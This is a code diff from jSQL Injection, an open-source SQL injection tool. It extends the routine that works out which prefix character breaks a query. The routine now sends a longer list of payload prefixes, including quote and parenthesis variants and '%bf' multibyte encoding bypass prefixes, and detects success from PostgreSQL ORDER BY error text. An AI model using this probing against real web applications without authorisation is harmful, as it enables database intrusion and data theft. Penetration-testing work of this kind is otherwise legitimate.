@@ -1,5 +1,8 @@
 package com.jsql.model.suspendable;
 
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
 import java.util.concurrent.CompletionService;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.ExecutorCompletionService;
@@ -39,6 +42,7 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
     public String run(Object... args) throws JSqlException {
         
         int nbStarInParameter = 0;
+        String characterInsertionByUser = "";
         
         if (ConnectionUtil.getQueryString().contains("*")) {
             nbStarInParameter++;
@@ -58,19 +62,19 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
             ConnectionUtil.getQueryString().contains("*")
             && ConnectionUtil.getMethodInjection() != MethodInjection.QUERY
         ) {
-            throw new InjectionFailureException("Activate method GET to use character * or remove it from GET parameters");
+            throw new InjectionFailureException("Select method GET to use character * or remove it from GET parameters");
             
         } else if (
             ConnectionUtil.getRequest().contains("*")
             && ConnectionUtil.getMethodInjection() != MethodInjection.REQUEST
         ) {
-            throw new InjectionFailureException("Activate one of Request method to use character * or remove it from Request parameters");
+            throw new InjectionFailureException("Select one of Request method to use character * or remove it from Request parameters");
             
         } else if (
             ConnectionUtil.getHeader().contains("*")
             && ConnectionUtil.getMethodInjection() != MethodInjection.HEADER
         ) {
-            throw new InjectionFailureException("Activate method Header to use character * or remove it from Header parameters");
+            throw new InjectionFailureException("Select method Header to use character * or remove it from Header parameters");
             
         }
         
@@ -112,7 +116,7 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
                 regexSearch.find();
                 try {
                     ConnectionUtil.setQueryString(regexSearch.group(1));
-                    return regexSearch.group(2);
+                    characterInsertionByUser = regexSearch.group(2);
                 } catch (IllegalStateException e) {
                     throw new InjectionFailureException("Incorrect Query String format", e);
                 }
@@ -127,7 +131,7 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
                 regexSearch.find();
                 try {
                     ConnectionUtil.setRequest(regexSearch.group(1));
-                    return regexSearch.group(2);
+                    characterInsertionByUser = regexSearch.group(2);
                 } catch (IllegalStateException e) {
                     throw new InjectionFailureException("Incorrect Request format", e);
                 }
@@ -141,7 +145,7 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
                 regexSearch.find();
                 try {
                     ConnectionUtil.setHeader(regexSearch.group(1));
-                    return regexSearch.group(2);
+                    characterInsertionByUser = regexSearch.group(2);
                 } catch (IllegalStateException e) {
                     throw new InjectionFailureException("Incorrect Header format", e);
                 }
@@ -155,7 +159,21 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
         // or   supplied argument is not a valid MySQL result resource
         ExecutorService taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
         CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
-        for (String insertionCharacter : new String[] {"0", "0'", "'", "-1", "1", "\"", "-1)", "-1))"}) {
+
+        List<String> charactersInsertion = new ArrayList<>(Arrays.asList(new String[]{
+            "-1", "-1'", "-1)", "-1))", "-1\"", "-1')", "-1'))", "-1\")", "-1\"))", 
+            "0", "0'", "0)", "0))", "0\"", "0')", "0'))", "0\")", "0\"))", 
+            "1", "1'", "1)", "1))", "1\"", "1')", "1'))", "1\")", "1\"))", 
+            "0%bf'", "0%bf\"", "0%bf')", "0%bf'))", "0%bf\")", "0%bf\"))", 
+            "1%bf'", "1%bf\"", "1%bf')", "1%bf'))", "1%bf\")", "1%bf\"))", 
+            "'", "\"",
+            "%bf'", "%bf\""
+        }));
+        if (!"".equals(characterInsertionByUser)) {
+            charactersInsertion.add(0, characterInsertionByUser);
+        }
+        
+        for (String insertionCharacter: charactersInsertion) {
             taskCompletionService.submit(
                 new CallablePageSource(
                     insertionCharacter +
@@ -165,7 +183,9 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
             );
         }
 
-        int total = 7;
+        String characterInsertion = null;
+        
+        int total = charactersInsertion.size();
         while (0 < total) {
 
             if (this.isSuspended()) {
@@ -185,17 +205,29 @@ public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
                     // the correct character: postgresql
                     Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()
                 ) {
-                    return currentCallable.getInsertionCharacter();
+                    characterInsertion = currentCallable.getInsertionCharacter();
+                    break;
                 }
             } catch (InterruptedException | ExecutionException e) {
-                LOGGER.error("Interruption while determining character injection", e);
+                LOGGER.error("Interruption while defining character injection", e);
             }
             
         }
+        
+        if (characterInsertion == null) {
+            if ("".equals(characterInsertionByUser)) {
+                characterInsertion = "1";
+            } else {
+                characterInsertion = characterInsertionByUser;
+            }
+            LOGGER.warn("No character insertion activates ORDER BY, forcing to ["+ characterInsertion +"]");
+        } else if (!characterInsertionByUser.equals(characterInsertion)) {
+            LOGGER.info("Character insertion ["+ characterInsertion +"] used in place of ["+ characterInsertionByUser +"] to activate error on ORDER BY");
+            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUser +"*] to force the value ["+ characterInsertionByUser +"]");
+        }
 
-        // Nothing seems to work, forces 1 has the character
         // TODO optional
-        return "1";
+        return characterInsertion;
     }
     
 }
